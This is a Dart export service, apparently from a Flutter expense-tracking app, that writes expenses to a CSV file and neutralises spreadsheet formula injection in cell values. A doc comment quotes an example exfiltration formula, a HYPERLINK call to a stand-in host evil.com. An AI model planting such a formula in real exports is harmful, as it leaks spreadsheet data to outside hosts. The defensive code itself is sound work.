import 'dart:io';
import 'package:csv/csv.dart';
import 'package:hive/hive.dart';
import 'package:path_provider/path_provider.dart';
import 'package:intl/intl.dart';
import '../models/expense.dart';
import '../models/custom_category.dart';
import 'expense_category_resolver.dart';
import 'storage_service.dart';

class ExportService {
  /// Prefixes Excel and Sheets treat as the start of a formula.
  static final _formulaStart = RegExp(r'^[=+\-@\t\r]');

  /// Neutralizes a value that a spreadsheet would evaluate.
  ///
  /// A merchant name is attacker-controlled — it arrives from an SMS or a bank
  /// statement — and a title like `=HYPERLINK("evil.com?"&A1)` runs when the
  /// export is opened. Prefixing with an apostrophe is the standard defence:
  /// spreadsheets show the original text and refuse to evaluate it.
  static String sanitizeCell(String value) =>
      _formulaStart.hasMatch(value) ? "'$value" : value;

  static Future<String> exportToCSV(
    List<Expense> expenses, {
    Iterable<CustomCategory>? customCategories,
  }) async {
    final catalog = _catalog(customCategories);
    List<List<dynamic>> rows = [];
    rows.add([
      "ID",
      "Date",
      "Title",
      "Amount",
      "Category",
      "Source",
      "Is Manual",
      "Is Uncategorized",
      "Note"
    ]);

    for (var exp in expenses) {
      rows.add([
        sanitizeCell(exp.id),
        DateFormat('yyyy-MM-dd HH:mm:ss').format(exp.date),
        sanitizeCell(exp.title),
        exp.amount,
        sanitizeCell(catalog.labelOf(exp)),
        sanitizeCell(exp.source),
        exp.isManual,
        exp.isUncategorized,
        sanitizeCell(exp.note ?? ""),
      ]);
    }

    String csv = const CsvEncoder().convert(rows);

    final directory = await getApplicationDocumentsDirectory();
    // Time-stamped so exporting twice in one day never overwrites the first file.
    final path =
        "${directory.path}/SpendSmart_Export_${DateFormat('yyyyMMdd_HHmmss').format(DateTime.now())}.csv";
    final file = File(path);
    await file.writeAsString(csv);
    
    return path;
  }

  static ExpenseCategoryCatalog _catalog(
    Iterable<CustomCategory>? customCategories,
  ) {
    if (customCategories != null) {
      return ExpenseCategoryCatalog(customCategories);
    }
    if (Hive.isBoxOpen(StorageService.customCategoryBoxName)) {
      return ExpenseCategoryCatalog(
        Hive.box<CustomCategory>(StorageService.customCategoryBoxName).values,
      );
    }
    return const ExpenseCategoryCatalog.empty();
  }
}

